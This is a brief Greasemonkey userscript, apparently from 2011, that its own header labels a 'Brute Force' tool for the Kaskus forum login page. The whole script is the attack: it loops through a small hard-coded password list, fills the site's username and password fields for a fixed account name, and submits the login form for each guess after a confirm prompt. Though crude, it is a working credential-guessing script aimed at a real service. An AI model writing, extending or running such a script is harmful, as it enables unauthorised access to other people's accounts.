// SeloDiBoncengan
// 2011-11-22//
// --------------------------------------------------------------------//
// Script selo di boncengan versi beta
// --------------------------------------------------------------------
// ==UserScript==
// @name          SeloDiBoncengan
// @namespace     http://www.kaskus.us/
// @description   Brute Force Kaskus beta version
// @include       http://www.kaskus.us/*

// ==/UserScript== 

var password = ["masih","dalam","percobaan","asdasd","selo"];
var i = 0;
var length = password.length;

for (i=0;i<length;i++)
	{
		document.getElementById("navbar_username").value = "IDKaskus";           
		document.getElementById("navbar_password").value = password[i];
		var answer = confirm("password = "+password[i]);
		if (answer){
			
			document.forms[0].submit();
		}
		
	}
		
		
	
